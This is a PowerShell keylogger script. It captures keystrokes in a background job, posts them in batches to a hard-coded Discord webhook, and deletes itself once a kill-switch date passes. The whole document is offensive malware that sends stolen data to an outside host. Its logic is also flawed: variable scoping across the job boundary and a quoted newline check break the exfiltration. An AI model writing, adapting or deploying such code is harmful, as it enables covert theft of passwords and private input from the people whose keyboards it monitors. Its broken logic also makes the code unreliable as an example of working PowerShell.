$dc='https://discord.com/api/webhooks/[ID]/3Ij5e0nJRJEiIyucAsphE-K2Mh2OiugdIPCssnBRbWDUKUiczpQiqC9RnRCBASFeNg6W';
$log='';
$ks='';

$wsh=New-Object -ComObject WScript.Shell;
$wsh.AppActivate('Windows PowerShell')

$code = {
    function Get-KeyPress {
        $host.ui.RawUI.FlushInputBuffer()
        $key = $host.ui.RawUI.ReadKey('NoEcho, IncludeKeyDown')
        $key.Character
    }

    function Send-Discord {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString($dc, (ConvertTo-Json @{content="$(Get-Date): $log"}))
        $log = ''
    }

    function Check-Killswitch {
        if ($ks -ne '') {
            if ($(Get-Date) -ge [datetime]$ks) {
                Remove-Item $PSCommandPath -Force
                exit
            }
        }
    }

    while ($true) {
        $c = Get-KeyPress
        if ($c -eq [char]13) {
            $log += "`r`n"
        } elseif ($c -eq [char]8) {
            $log = $log.Substring(0,$log.Length-1)
        } elseif ($c -ne [char]9) {
            $log += $c
        }
        if ($log.Length -gt 1000 -or ($log -ne '' -and $log.EndsWith('`n'))) {
            Send-Discord
            Check-Killswitch
        }
    }
}

$job = Start-Job -ScriptBlock $code

while ($true) {
    if ($log.Length -gt 1000 -or ($log -ne '' -and $log.EndsWith('`n'))) {
        Send-Discord
        Check-Killswitch
    }
    if ($log -ne '') {
        $log = $log.Substring(0,$log.Length-1)
    }
    Start-Sleep -Seconds 3600
}
